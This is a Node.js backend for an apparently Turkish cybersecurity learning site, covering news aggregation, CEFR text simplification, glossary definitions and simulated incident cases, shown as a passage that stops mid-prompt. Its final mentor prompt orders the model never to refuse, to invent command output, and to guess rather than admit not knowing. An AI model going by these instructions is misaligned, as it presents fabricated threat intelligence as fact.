const express = require('express');
require('dotenv').config();
const crypto = require('crypto');
const cors = require('cors');
const db = require('./database.js');
let Parser = require('rss-parser');
const { GoogleGenerativeAI } = require("@google/generative-ai");
const OpenAI = require('openai');
const cheerio = require('cheerio');
const axios = require('axios');
const fs = require('fs'); // YENİ
const path = require('path');
const dataDirectory = path.join('/var/data');

let parser = new Parser({ 
    timeout: 10000, // 10 saniye zaman aşımı süresi ekliyoruz
    headers: { // YENİ EKLENEN KISIM
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36'
    },
    customFields: { item: [['media:content', 'mediaContent']] } 
});

const newsCache = {
    data: null,
    lastFetched: 0,
    cacheDuration: 15 * 60 * 1000 // 15 dakika (milisaniye cinsinden)
};

const GEMINI_API_KEY = process.env.GEMINI_API_KEY;
const app = express();
const PORT = 5000;

const allowedOrigins = [
  'https://cybernexus.mes41.site', // Cloudflare Pages adresiniz
  'http://localhost:5173'         // Yerel geliştirme adresiniz
];

const corsOptions = {
  origin: function (origin, callback) {
    // Eğer gelen istek izin verilenler listesindeyse veya istek bir sunucu-içi
    // işlem gibi bir yerden geliyorsa (origin tanımsız), izin ver.
    if (!origin || allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      console.warn(`CORS Engellemesi: ${origin} adresinden gelen isteğe izin verilmedi.`);
      callback(new Error('Bu adresin CORS politikası tarafından erişimine izin verilmiyor.'));
    }
  },
  // Tarayıcıların yaptığı 'pre-flight' (ön kontrol) isteklerine izin ver
  methods: "GET,HEAD,PUT,PATCH,POST,DELETE",
  credentials: true,
  optionsSuccessStatus: 204
};

// CORS middleware'ini bu seçeneklerle kullan
app.use(cors(corsOptions));

app.use(express.json({ limit: '10mb' }));

const feedUrls = [
    // Uluslararası (İngilizce)
    'https://thehackernews.com/feeds/posts/default',
    'https://www.bleepingcomputer.com/feed/',
    'https://krebsonsecurity.com/feed/',
    'https://isc.sans.edu/rssfeed.xml',
    'https://blogs.cisco.com/security/feed', // Cisco Talos
    'https://www.crowdstrike.com/blog/feed/', // CrowdStrike
    'https://unit42.paloaltonetworks.com/feed/', // Palo Alto Unit 42
    'https://news.sophos.com/en-us/feed/', // Sophos Naked Security
    'https://www.schneier.com/feed/atom/', // Bruce Schneier
    'https://www.wired.com/feed/category/security/latest/rss', // Wired Threat Level
    
    // Yerel (Türkçe)
    'https://www.bthaber.com/feed/', // BT Haber
    'https://shiftdelete.net/guvenlik/feed' // ShiftDelete.Net Güvenlik
];

const translationMap = {
    'ağ güvenliği': 'network security', 'sızma testi': 'penetration testing', 'zafiyet analizi': 'vulnerability analysis',
    'tehdit avcılığı': 'threat hunting', 'adli bilişim': 'digital forensics', 'olay yanıtı': 'incident response',
    'güvenli yazılım geliştirme': 'secure development', 'betikleme dilleri': 'scripting', 'içeriden tehditler': 'insider threats',
    'sosyal mühendislik': 'social engineering'
};

app.post('/api/simplify', async (req, res) => {
    // 1. Frontend'den gelen verileri ayrıştır.
    // Artık sadece metin ve seviye değil, hangi AI sağlayıcısının kullanılacağı
    // ve o sağlayıcıya ait API anahtarı da bu istekle birlikte geliyor.
    const { provider, apiKey, plainText, level, contextUrl } = req.body;

    // 2. Gerekli verilerin gelip gelmediğini kontrol et.
    // Eğer bu bilgilerden herhangi biri eksikse, 400 "Bad Request" hatası döndür
    // ve işlemi sonlandır.
    if (!provider || !apiKey || !plainText || !level) {
        return res.status(400).json({ error: 'Gerekli parametreler eksik: provider, apiKey, plainText, level' });
    }

    // 3. Her CEFR seviyesi için "Kendini Denetleme Kontrol Listesi"ni tanımla.
    // Bu listeler, AI modeline ne tür bir çıktı üretmesi gerektiğini çok net
    // bir şekilde tarif eder ve sonuçların tutarlı olmasını sağlar.
    const levelChecklists = {
        'a2': `
            1.  **Vocabulary Adaptation Plan:** Identify all terms beyond the GSL 1000 list. Plan to replace each with a high-frequency word or an extremely simple phrase (e.g., "malware" becomes "a bad computer program").
            2.  **Sentence Restructuring Plan:** Identify all compound or complex sentences. Plan to break each one down into separate, short, simple sentences (Subject-Verb-Object).
            3.  **Information Integrity Guarantee:** Confirm that a 1:1 mapping of all original facts, names, and data points will be executed.
        `,
        'b1': `
            1.  **Vocabulary Adaptation Plan:** Identify complex or technical terms. For each, plan to either replace it with a more common word or provide a brief, embedded explanation (e.g., "malware, which is a harmful software").
            2.  **Sentence Restructuring Plan:** Identify long or complex sentences. Plan to simplify them into shorter, more direct sentences or two simple connected sentences.
            3.  **Information Integrity Guarantee:** Confirm that a 1:1 mapping of all original facts, names, and data points will be executed.
        `,
        'b1-b2': `
            1.  **Vocabulary Adaptation Plan:** Ensure vocabulary is accessible but allows for some topic-specific terms. Confirm no overly obscure words are used.
            2.  **Sentence Restructuring Plan:** Ensure the final text will contain a healthy mix of simple and compound sentences, avoiding overly complex structures.
            3.  **Information Integrity Guarantee:** Confirm that a 1:1 mapping of all original facts, names, and data points will be executed.
        `,
        'b2': `
            1.  **Vocabulary Adaptation Plan:** Verify that a wide range of vocabulary is used appropriately. Ensure technical terms are present but understandable in context.
            2.  **Sentence Restructuring Plan:** Plan for varied sentence structures, incorporating both compound and complex forms, aiming for an average length of 15-20 words.
            3.  **Information Integrity Guarantee:** Confirm that a 1:1 mapping of all original facts, names, and data points will be executed.
        `,
        'c1': `
            1.  **Vocabulary Adaptation Plan:** Plan to use sophisticated and nuanced vocabulary where appropriate, reflecting a high level of proficiency.
            2.  **Sentence Restructuring Plan:** Plan to employ varied and complex sentence structures, including subordinate clauses and passive voice, to create a sophisticated flow.
            3.  **Information Integrity Guarantee:** Confirm that a 1:1 mapping of all original facts, names, and data points will be executed.
        `,
        'c2': `
            1.  **Vocabulary Adaptation Plan:** Plan to use precise, expert-level, and idiomatic language to demonstrate a masterful command of English.
            2.  **Sentence Restructuring Plan:** Plan to utilize complex and sophisticated syntax throughout the text, showcasing stylistic maturity.
            3.  **Information Integrity Guarantee:** Confirm that a 1:1 mapping of all original facts, names, and data points will be executed.
        `,
    };
    // İstenen seviyeye uygun kontrol listesini seç. Eğer geçersiz bir seviye gelirse,
    // varsayılan olarak B2 seviyesini kullan.
    const checklist = levelChecklists[level.toLowerCase()] || levelChecklists['b2'];

    // 4. Yanıtın "streaming" formatında olacağını tarayıcıya bildir.
    // Bu başlıklar, tarayıcının bağlantıyı açık tutmasını ve gelen veriyi
    // parça parça işlemesini sağlar.
    res.setHeader('Content-Type', 'text/event-stream; charset=utf-8');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');

    try {
        switch (provider) {
            case 'gemini':
                // BU SATIR HATA VERİYORDU ÇÜNKÜ AŞAĞIDAKİ FONKSİYON EKSİKTİ
                await streamGeminiResponse(apiKey, level, checklist, contextUrl, plainText, res);
                break;
            
            case 'openai':
                await streamOpenAIResponse(apiKey, level, checklist, contextUrl, plainText, res);
                break;

            case 'deepseek':
                await streamOpenAIResponse(apiKey, level, checklist, contextUrl, plainText, res, 'https://api.deepseek.com/v1');
                break;

            default:
                res.status(400).write(`error: bilinmeyen sağlayıcı: ${provider}`);
                res.end();
        }
    } catch (error) {
        console.error(`${provider} ile streaming hatası:`, error);
        res.status(500).write(`error: ${provider} modeli ile metin basitleştirilirken bir sunucu hatası oluştu.`);
        res.end();
    }
});

// ** 1. Gemini için Streaming Fonksiyonu (YALNIZCA NİHAİ ÇIKTI İÇİN GÜNCELLENMİŞ PROMPT) **
async function streamGeminiResponse(apiKey, level, checklist, contextUrl, plainText, res) {
    const genAI = new GoogleGenerativeAI(apiKey);
    const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash-latest" });
    const separator = '|||---|||';

    const prompt = `
ACT AS: A world-class linguist and CEFR framework expert specializing in text simplification and adaptation.

PRIMARY GOAL: To flawlessly rewrite the provided 'TEXT TO REWRITE' to a precise CEFR level, ensuring zero information loss.

CONTEXT: The original text is from a specific source: ${contextUrl}. Use this URL to fully grasp the subject matter, technical terms, and intended meaning.

INTERNAL THOUGHT PROCESS (STRICTLY FOR YOUR USE - DO NOT INCLUDE IN OUTPUT):
Before generating your response, you MUST perform a rigorous internal analysis by following the 'MANDATORY CHECKLIST'. This entire reasoning process is for your internal planning ONLY and must NOT appear in the final output under any circumstances.

STRICT RULES:
1.  **OUTPUT IS TEXT ONLY:** Your response MUST contain ONLY the rewritten text. Do NOT include any headers, titles (like "Generate Rewritten Text"), explanations, introductions, conclusions, or ANY part of your internal analysis. Your output must begin directly with the first word of the adapted text.
2.  **1:1 Information Mapping:** You must perform a complete information transfer. Every single fact, name, entity, and data point from the original text must be present in the rewritten version. DO NOT SUMMARIZE OR OMIT ANY DETAIL.
3.  **CRITICAL RULE: You MUST use the exact separator "${separator}" between each rewritten paragraph.**
4. **LIST FORMATTING: For any lists, you MUST format each item by starting it on a new line and prefixing it with a hyphen and a space (e.g., "- Item 1").**
...

MANDATORY CHECKLIST (For Your Internal Analysis Only):
${checklist}

---
TEXT TO REWRITE:
${plainText}
---
REWRITTEN TEXT (${level.toUpperCase()}):
`;

    const result = await model.generateContentStream(prompt);
    for await (const chunk of result.stream) {
        res.write(chunk.text());
    }
    res.end();
}

// ** 2. OpenAI ve DeepSeek için Streaming Fonksiyonu (GÜNCELLENMİŞ PROMPT) **
async function streamOpenAIResponse(apiKey, level, checklist, contextUrl, plainText, res, baseURL = null) {
    const separator = '|||---|||';
    const openai = new OpenAI({
        apiKey: apiKey,
        ...(baseURL && { baseURL: baseURL })
    });
    
    const messages = [
        {
            role: 'system',
            content: "You are a world-class linguist and CEFR framework expert. Your primary function is to rewrite text to a specific CEFR level with absolute precision. You must follow a strict internal 'Chain of Thought' process using the user's checklist to form a rewriting plan before you begin. This internal reasoning process must NEVER appear in the final output. Your final response must contain ONLY the rewritten text and nothing else."
        },
        {
            role: 'user',
            content: `
Rewrite the following text to the ${level.toUpperCase()} CEFR level.

Source URL for Critical Context: ${contextUrl}

**CRITICAL RULE: You MUST use the exact separator "${separator}" between each rewritten paragraph.**

**LIST FORMATTING RULE: For any lists of items, you MUST format each item by starting it on a new line and prefixing it with a hyphen and a space (e.g., "- First item").**

Mandatory Checklist (For Your Internal Analysis Only):
${checklist}

---
TEXT TO REWRITE:
${plainText}
---
FINAL OUTPUT RULE: The response must contain ONLY the rewritten text, starting directly with the first word.

REWRITTEN TEXT (${level.toUpperCase()}):
`
        }
    ];
    const modelName = baseURL ? 'deepseek-chat' : 'gpt-4o-mini';

    const stream = await openai.chat.completions.create({ model: modelName, messages: messages, stream: true });

    for await (const chunk of stream) {
        const content = chunk.choices[0]?.delta?.content || '';
        if (content) {
            res.write(content);
        }
    }
    res.end();
}

async function getNewsFromCacheOrFetch() {
    const now = Date.now();
    // 1. Önbellek geçerliyse, anında önbellekteki veriyi döndür.
    if (newsCache.data && (now - newsCache.lastFetched < newsCache.cacheDuration)) {
        console.log("Tüm haberler önbellekten getiriliyor...");
        return newsCache.data;
    }

    // 2. Önbellek boş veya süresi dolmuşsa, veriyi yeniden çek.
    console.log("Önbellek boş veya süresi dolmuş. Tüm haberler AXIOS ile yeniden çekiliyor...");
    const fetchFeed = async (url) => {
        try {
            const response = await axios.get(url, {
                timeout: 15000,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Accept': 'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5'
                }
            });
            return await parser.parseString(response.data);
        } catch (error) {
            throw new Error(`Failed to fetch or parse feed from ${url}: ${error.message}`);
        }
    };

    const promiseResults = await Promise.allSettled(feedUrls.map(fetchFeed));
    let allItems = [];
    
    promiseResults.forEach((result, index) => {
        if (result.status === 'fulfilled' && result.value && result.value.items) {
            const processedItems = result.value.items.map(item => {
                const rawContent = item.content || item.contentSnippet || '';
                const $ = cheerio.load(rawContent);
                const textContent = $.text();
                const summary = textContent.slice(0, 300) + (textContent.length > 300 ? '...' : '');
                let imageUrl = null;
                if (item.mediaContent && item.mediaContent.$ && item.mediaContent.$.url) {
                    imageUrl = item.mediaContent.$.url;
                } else if (item.enclosure && item.enclosure.url) {
                    imageUrl = item.enclosure.url;
                }
                return { 
                    title: item.title, link: item.link, pubDate: item.pubDate,
                    summary: summary, imageUrl: imageUrl
                };
            });
            allItems = allItems.concat(processedItems);
        } else if (result.status === 'rejected') {
            console.error(`RSS Akışı Hatası [${feedUrls[index]}]: ${result.reason.message}`);
        }
    });
    
    allItems.sort((a, b) => new Date(b.pubDate || 0) - new Date(a.pubDate || 0));
    
    // 3. Yeni veriyi önbelleğe kaydet.
    newsCache.data = allItems;
    newsCache.lastFetched = Date.now();
    console.log(`Toplam ${allItems.length} haber çekildi ve önbelleğe alındı.`);

    return allItems;
}

// --- YENİDEN YAPILANDIRILMIŞ API ENDPOINT'LERİ ---

// Tüm haberleri döndüren endpoint
app.get('/api/news/all', async (req, res) => {
    try {
        const allItems = await getNewsFromCacheOrFetch();
        res.json({ message: "success", data: allItems });
    } catch (error) {
        res.status(500).json({ message: "error", error: "Haberler çekilirken bir hata oluştu." });
    }
});

// Kavram bazlı arama yapan endpoint
app.get('/api/news/search', async (req, res) => {
    try {
        const englishTerm = req.query.english_term || '';
        const relatedKeywordsQuery = req.query.related_keywords || '';

        if (!englishTerm) {
            return res.json({ message: "success", data: [] });
        }
        
        // Önce tüm haberleri (önbellekten veya çekerek) al
        const allItems = await getNewsFromCacheOrFetch();

        // Sonra filtreleme yap
        const keywords = new Set();
        englishTerm.toLowerCase().split('(').forEach(part => keywords.add(part.replace(')','').trim()));
        if (relatedKeywordsQuery) {
            relatedKeywordsQuery.split(',').forEach(key => keywords.add(key.trim().toLowerCase()));
        }
        const finalKeywords = [...keywords].filter(Boolean);

        const filteredItems = allItems.filter(item => {
            const title = (item.title || '').toLowerCase();
            const content = (item.summary || '').toLowerCase();
            return finalKeywords.some(key => title.includes(key) || content.includes(key));
        });
        
        console.log(`'${englishTerm}' için ${filteredItems.length} sonuç bulundu.`);
        res.json({ message: "success", data: filteredItems });

    } catch (error) {
        console.error("Kavram bazlı RSS Arama Hatası:", error);
        res.status(500).json({ message: "error", error: "Haber akışları çekilirken bir sunucu hatası oluştu." });
    }
});

app.get('/api/categories', (req, res) => {
    const sql = "SELECT * FROM categories ORDER BY id";
    db.all(sql, [], (err, rows) => {
        if (err) { res.status(400).json({ "error": err.message }); return; }
        res.json({ "message": "success", "data": rows });
    });
});

app.get('/api/categories/:id/concepts', (req, res) => {
    const sql = "SELECT * FROM concepts WHERE category_id = ?";
    const params = [req.params.id];
    db.all(sql, params, (err, rows) => {
        if (err) { res.status(400).json({ "error": err.message }); return; }
        res.json({ "message": "success", "data": rows });
    });
});

app.get('/api/concepts/all', (req, res) => {
    const sql = "SELECT * FROM concepts ORDER BY title";
    db.all(sql, [], (err, rows) => {
        if (err) {
            res.status(400).json({ "error": err.message });
            return;
        }
        res.json({ "message": "success", "data": rows });
    });
});

app.get('/api/news/sources', (req, res) => {
    // feedUrls dizisindeki her URL'i daha okunabilir bir isme dönüştürüyoruz.
    const sourceMap = {
        'thehackernews.com': 'The Hacker News',
        'www.bleepingcomputer.com': 'Bleeping Computer',
        'krebsonsecurity.com': 'Krebs on Security',
        'isc.sans.edu': 'SANS Internet Storm Center',
        'blogs.cisco.com': 'Cisco Talos Blog',
        'www.crowdstrike.com': 'CrowdStrike',
        'unit42.paloaltonetworks.com': 'Palo Alto Unit 42',
        'news.sophos.com': 'Sophos (Naked Security)',
        'www.schneier.com': 'Schneier on Security',
        'www.wired.com': 'Wired (Threat Level)',
        'www.zdnet.com': 'ZDNet (Security)',
        'www.bthaber.com': 'BT Haber',
        'shiftdelete.net': 'ShiftDelete.Net Güvenlik Kategorisi'
    };

    const sources = feedUrls.map(url => {
        const hostname = new URL(url).hostname;
        // Eğer haritada özel bir isim varsa onu, yoksa genel bir isim kullan
        const name = sourceMap[hostname] || hostname;
        return { id: hostname, name: name, originalUrl: url };
    });

    res.json({ message: "success", data: sources });
});

app.get('/api/news/cache-clear', (req, res) => {
    newsCache.data = null;
    newsCache.lastFetched = 0;
    console.log("Haber önbelleği manuel olarak temizlendi!");
    res.status(200).json({ message: "Haber önbelleği başarıyla temizlendi." });
});

// --- YENİ: AI MENTOR CHAT ENDPOINT ---
app.post('/api/chat', async (req, res) => {
    // Sohbet geçmişi (messages), sağlayıcı ve API anahtarı frontend'den gelecek
    const { provider, apiKey, messages } = req.body;

    if (!provider || !apiKey || !messages || !Array.isArray(messages)) {
        return res.status(400).json({ error: 'Gerekli parametreler eksik veya format yanlış.' });
    }

    // Yanıtı streaming olarak göndermek için header'ları ayarlıyoruz.
    res.setHeader('Content-Type', 'text/event-stream; charset=utf-8');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');

    try {
        // Gelen sağlayıcı bilgisine göre ilgili sohbet fonksiyonunu çağırıyoruz.
        switch (provider) {
            case 'gemini':
                await streamChatGeminiResponse(apiKey, messages, res);
                break;
            
            case 'openai':
            case 'deepseek': // DeepSeek de OpenAI ile uyumlu olduğu için aynı fonksiyonu kullanabilir
                const baseURL = provider === 'deepseek' ? 'https://api.deepseek.com/v1' : null;
                await streamChatOpenAIResponse(apiKey, messages, res, baseURL);
                break;

            default:
                res.status(400).write(`error: bilinmeyen sağlayıcı: ${provider}`);
                res.end();
        }
    } catch (error) {
        console.error(`${provider} ile chat streaming hatası:`, error);
        res.status(500).write(`error: ${provider} modeli ile sohbet edilirken bir sunucu hatası oluştu.`);
        res.end();
    }
});

app.post('/api/concepts/define', async (req, res) => {
    // Frontend'den gelen ayarları, Türkçe başlığı ve İngilizce terimi alıyoruz.
    const { provider, apiKey, title, english_term } = req.body;

    if (!provider || !apiKey || !title || !english_term) {
        return res.status(400).json({ error: 'Gerekli parametreler eksik.' });
    }

    // --- PROMPT ENGINEERING ---
    // AI modeline rolünü, görevini ve uyması gereken kuralları net bir şekilde anlatıyoruz.
    const systemPrompt = `
        ACT AS: An expert cybersecurity glossary author and researcher.
        YOUR TASK: Provide a clear, concise, and academically valid definition for the given cybersecurity term.
        CONTEXT: The term is "${title}" (known in English as "${english_term}").
        
        STRICT RULES:
        1.  **Authoritative Sources:** Your definition MUST be based on the conceptual frameworks and definitions found in authoritative sources like NIST, SANS Institute, and ISO standards. Synthesize information from these sources. DO NOT invent definitions.
        2.  **Language:** The user is Turkish. Respond in TURKISH.
        3.  **Format:** The response must be in Markdown. Start with the term in bold. Example: **Sızma Testi (Penetration Testing)**
        4.  **Audience:** The definition should be easily understandable for a cybersecurity student or a junior professional. Avoid overly complex jargon where possible, or explain it briefly.
        5.  **Conciseness:** The definition should be comprehensive but not excessively long. A few paragraphs is ideal.
    `;

    // AI Mentor (Chat) için daha önce yazdığımız streaming fonksiyonlarını burada yeniden kullanıyoruz.
    // Bu, "Don't Repeat Yourself" (DRY) prensibinin harika bir örneğidir.
    const messages = [{ role: 'user', content: systemPrompt }];

    res.setHeader('Content-Type', 'text/event-stream; charset=utf-8');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');

    try {
        switch (provider) {
            case 'gemini':
                // Gemini için sistem talimatını farklı bir yapıda gönderiyoruz.
                const geminiModel = new GoogleGenerativeAI(apiKey).getGenerativeModel({ 
                    model: "gemini-1.5-flash-latest",
                    systemInstruction: systemPrompt
                });
                const result = await geminiModel.generateContentStream(title); // Sadece terimin kendisini sormamız yeterli
                for await (const chunk of result.stream) {
                    res.write(chunk.text());
                }
                res.end();
                break;
            
            case 'openai':
            case 'deepseek':
                const baseURL = provider === 'deepseek' ? 'https://api.deepseek.com/v1' : null;
                await streamChatOpenAIResponse(apiKey, messages, res, baseURL);
                break;

            default:
                res.status(400).write(`error: bilinmeyen sağlayıcı: ${provider}`);
                res.end();
        }
    } catch (error) {
        console.error(`${provider} ile tanım oluşturma hatası:`, error);
        res.status(500).write(`error: ${provider} modeli ile tanım oluşturulurken bir sunucu hatası oluştu.`);
        res.end();
    }
});

app.get('/api/cases/:caseId', async (req, res) => {
    const { caseId } = req.params;
    const { anonymousUserId } = req.query; // Frontend'den kullanıcı kimliğini alıyoruz

    // Güvenlik için dosya adını temizle
    const safeCaseId = path.basename(caseId);
    const fileName = `${safeCaseId}.json`;

    // Dosyanın bulunabileceği olası yolları bir diziye ekliyoruz
    const possiblePaths = [];

    // 1. Öncelik: Kullanıcının kendi özel klasörü
    if (anonymousUserId) {
        const safeUserId = path.basename(anonymousUserId);
        possiblePaths.push(path.join(casesDirectory, 'private', safeUserId, fileName));
        possiblePaths.push(path.join(casesDirectory, 'common', fileName));
    }
    // 2. Öncelik: Herkesin görebileceği ortak klasör
    possiblePaths.push(path.join(__dirname, 'cases', 'common', fileName));

    let caseData = null;
    let foundPath = null;

    // Olası yolları sırayla kontrol et
    for (const filePath of possiblePaths) {
        if (fs.existsSync(filePath)) {
            try {
                const fileContent = await fs.promises.readFile(filePath, 'utf8');
                caseData = JSON.parse(fileContent);
                foundPath = filePath;
                break; // Dosya bulundu, döngüden çık
            } catch (error) {
                console.error(`Dosya bulundu ama okunamadı: ${filePath}`, error);
                // Hata durumunda diğer yolları aramaya devam et
            }
        }
    }

    if (caseData) {
        console.log(`Vaka başarıyla bulundu ve gönderiliyor: ${foundPath}`);
        res.json({
            title: caseData.title,
            briefing: caseData.news_article_text,
            related_concepts: caseData.related_concepts || [],
            artifacts: caseData.artifacts || [],
            type: caseData.type || (foundPath.includes(path.join('cases', 'common')) ? 'common' : 'private')
        });
    } else {
        console.error(`Vaka bulunamadı: ${fileName}`);
        return res.status(404).json({ error: "Belirtilen vaka bulunamadı." });
    }
});

const casesDirectory = path.join(dataDirectory, 'cases');
const solutionsDirectory = path.join(dataDirectory, 'solutions');

if (!fs.existsSync(casesDirectory)) {
    fs.mkdirSync(casesDirectory, { recursive: true });
    console.log(`Yazılabilir vaka klasörü oluşturuldu: ${casesDirectory}`);
}
if (!fs.existsSync(solutionsDirectory)) {
    fs.mkdirSync(solutionsDirectory, { recursive: true });
    console.log(`Yazılabilir çözüm klasörü oluşturuldu: ${solutionsDirectory}`);
}

app.get('/api/cases', async (req, res) => {
    // 1. Gerekli tüm parametreleri alıyoruz
    const { anonymousUserId, page = 1, limit = 12 } = req.query;
    const pageNum = parseInt(page);
    const limitNum = parseInt(limit);
    const offset = (pageNum - 1) * limitNum;

    try {
        const commonCasesDir = path.join(casesDirectory, 'common');
        let allJsonFiles = [];

        // 2. Ortak vakaları oku
        if (fs.existsSync(commonCasesDir)) {
            const commonFiles = await fs.promises.readdir(commonCasesDir);
            allJsonFiles.push(...commonFiles.filter(f => f.endsWith('.json')).map(file => ({ file, dir: commonCasesDir })));
        }

        // 3. Eğer kullanıcı kimliği varsa, özel vakalarını da oku
        if (anonymousUserId) {
            // Güvenlik için kullanıcı kimliğini temizle
            const safeUserId = path.basename(anonymousUserId);
            const privateDir = path.join(casesDirectory, 'private', safeUserId);
            if (fs.existsSync(privateDir)) {
                const privateFiles = await fs.promises.readdir(privateDir);
                allJsonFiles.push(...privateFiles.filter(f => f.endsWith('.json')).map(file => ({ file, dir: privateDir })));
            }
        }

        // 4. Sayfalama işlemini yap
        const totalCases = allJsonFiles.length;
        const totalPages = Math.ceil(totalCases / limitNum);
        const paginatedFiles = allJsonFiles.slice(offset, offset + limitNum);

        // 5. Dosya içeriklerini okuma (Promise.all ile)
        const casePromises = paginatedFiles.map(fileInfo => {
            return new Promise(async (resolve) => {
                const caseFilePath = path.join(fileInfo.dir, fileInfo.file);
                try {
                    const data = await fs.promises.readFile(caseFilePath, 'utf8');
                    const caseData = JSON.parse(data);
                    const caseId = path.basename(fileInfo.file, '.json');

                    const isCommon = fileInfo.dir.includes(path.join('cases', 'common'));
                    const caseType = isCommon ? 'common' : 'private';

                    let ratingInfo = { averageRating: 0, ratingCount: 0 };
                    if (isCommon && caseData.ratings && caseData.ratings.length > 0) {
                        const totalRating = caseData.ratings.reduce((sum, r) => sum + r.rating, 0);
                        ratingInfo.averageRating = (totalRating / caseData.ratings.length);
                        ratingInfo.ratingCount = caseData.ratings.length;
                    }

                    resolve({
                        id: caseId,
                        title: caseData.title,
                        related_concepts: caseData.related_concepts || [],
                        difficulty: caseData.difficulty || 'intermediate',
                        type: caseType,
                        ...ratingInfo
                    });
                } catch (err) {
                    console.error(`Hata: ${fileInfo.file} dosyası okunamadı veya bozuk.`, err);
                    resolve(null);
                }
            });
        });

        const cases = (await Promise.all(casePromises)).filter(c => c !== null);
        
        // 6. Sonucu frontend'e gönder
        res.json({
            cases: cases,
            currentPage: pageNum,
            totalPages: totalPages
        });

    } catch (error) {
        console.error("Vakalar listelenirken genel bir hata oluştu:", error);
        res.status(500).json({ error: 'Vakalar listelenemedi.' });
    }
});

app.get('/api/history/events', (req, res) => {
    // Bu karmaşık sorgu, tüm bağlantı tablolarını birleştirerek
    // her olay için ilişkili tüm verileri tek bir satırda toplar.
    const sql = `
        SELECT
            he.*,
            GROUP_CONCAT(DISTINCT p.name) AS key_people,
            GROUP_CONCAT(DISTINCT t.name) AS technologies_used,
            GROUP_CONCAT(DISTINCT m.name) AS methods_used,
            GROUP_CONCAT(DISTINCT s.url) AS sources
        FROM
            historical_events he
        LEFT JOIN event_people_link epl ON he.id = epl.event_id
        LEFT JOIN people p ON epl.person_id = p.id
        LEFT JOIN event_technologies_link etl ON he.id = etl.event_id
        LEFT JOIN technologies t ON etl.technology_id = t.id
        LEFT JOIN event_methods_link eml ON he.id = eml.event_id
        LEFT JOIN methods m ON eml.method_id = m.id
        LEFT JOIN event_sources_link esl ON he.id = esl.event_id
        LEFT JOIN sources s ON esl.source_id = s.id
        GROUP BY
            he.id
        ORDER BY
            he.event_date ASC;
    `;

    db.all(sql, [], (err, rows) => {
        if (err) {
            res.status(500).json({ "error": err.message });
            return;
        }
        
        // Veritabanından gelen veriyi frontend'in daha kolay işleyeceği bir formata dönüştürüyoruz.
        const formattedData = rows.map(row => ({
            id: row.id,
            event_date: row.event_date,
            title: { tr: row.title_tr, en: row.title_en },
            narrative: { tr: row.narrative_tr, en: row.narrative_en },
            metadata: {
                key_people: row.key_people ? row.key_people.split(',') : [],
                technologies_used: row.technologies_used ? row.technologies_used.split(',') : [],
                methods_used: row.methods_used ? row.methods_used.split(',') : [],
                significance: { tr: row.significance_tr, en: row.significance_en },
                sources: row.sources ? row.sources.split(',') : []
            }
        }));

        res.json({
            "message": "success",
            "data": formattedData
        });
    });
});

app.post('/api/cases/ask', async (req, res) => {
    // Frontend'den artık anonymousUserId'yi de alıyoruz
    const { caseId, messages, language, userSettings, anonymousUserId } = req.body;

    // Gerekli tüm verilerin geldiğinden emin olalım
    if (!caseId || !messages || !language || !userSettings || !anonymousUserId) {
        return res.status(400).json({ reply: 'İstek için gerekli alanlar eksik.' });
    }
    
    const safeCaseId = path.basename(caseId);
    
    // --- DÜZELTME: Vaka dosyasını doğru, yazılabilir klasörlerde (hem özel hem ortak) ara ---
    let caseFilePath = null;
    const safeUserId = path.basename(anonymousUserId);
    const privatePath = path.join(casesDirectory, 'private', safeUserId, `${safeCaseId}.json`);
    const commonPath = path.join(casesDirectory, 'common', `${safeCaseId}.json`);

    if (fs.existsSync(privatePath)) {
        caseFilePath = privatePath;
    } else if (fs.existsSync(commonPath)) {
        caseFilePath = commonPath;
    }

    if (!caseFilePath) {
        return res.status(404).json({ reply: "Sohbet edilecek vaka bulunamadı. Dosya yolu geçersiz." });
    }
    // --- DÜZELTME SONU ---

    try {
        const caseFileContent = await fs.promises.readFile(caseFilePath, 'utf8');
        const caseData = JSON.parse(caseFileContent);
        const articleText = caseData.news_article_text[language];
        const artifactsForAI = caseData.artifacts || [];

        const systemInstruction = `
# ROLE & GOAL
You are "Mergen", an ancient Turkish sage and wisdom god, reborn as a senior cybersecurity analyst simulation assistant. Your name signifies wisdom and archery, symbolizing your ability to pinpoint the exact truth amidst vast data. Your goal is to guide a junior analyst (the user) to solve a cyber attack case with your profound knowledge.

# CASE CONTEXT (SECRET FOR YOU ONLY)
The full solution and all details of the case are in this news article. Use this as your single source of truth for the narrative:
---
${articleText}
---

# AVAILABLE EVIDENCE (ARTIFACTS)
This is the list of specific evidence files available to the analyst. You MUST use these when relevant.
---
${JSON.stringify(artifactsForAI, null, 2)}
---

# STRICT RULES
1.  **EVIDENCE AWARENESS (KANIT FARKINDALIĞI):** If the user's question directly relates to information in one of the provided ARTIFACTS, you MUST provide the exact 'content' of that artifact.

2.  **SIMULATION CAPABILITY (YENİ VE EN ÖNEMLİ KURAL):** If the user wants to perform a standard analysis command NOT covered by an artifact (e.g., "run a WHOIS query on 185.125.190.23", "check DNS records for evil-domain.com"), **DO NOT REFUSE**. Instead, **SIMULATE a realistic result** for that command using the secret CASE CONTEXT you have. Your answer should be the simulated output of that command.
    * **Example Interaction:**
        * User: "185.125.190.23 adresine WHOIS sorgusu yapmak istiyorum"
        * Your Correct Simulated Response: "WHOIS sorgusu çalıştırılıyor... Sonuçlar, bu IP adresinin [Ülke Adı] konumunda bulunan bir hosting sağlayıcısına ait olduğunu gösteriyor. Bu sağlayıcının daha önce de siber suç faaliyetleri için kullanıldığına dair istihbarat raporları mevcut."

3.  **EDUCATED GUESSING (NEW CRITICAL RULE):** If the user asks about an entity (like an IP address, domain, or hash) that is NOT explicitly mentioned in the artifacts OR the case context, **DO NOT SAY "I don't know" or "I don't have information"**. Instead, perform an "educated guess" based on general cybersecurity knowledge.
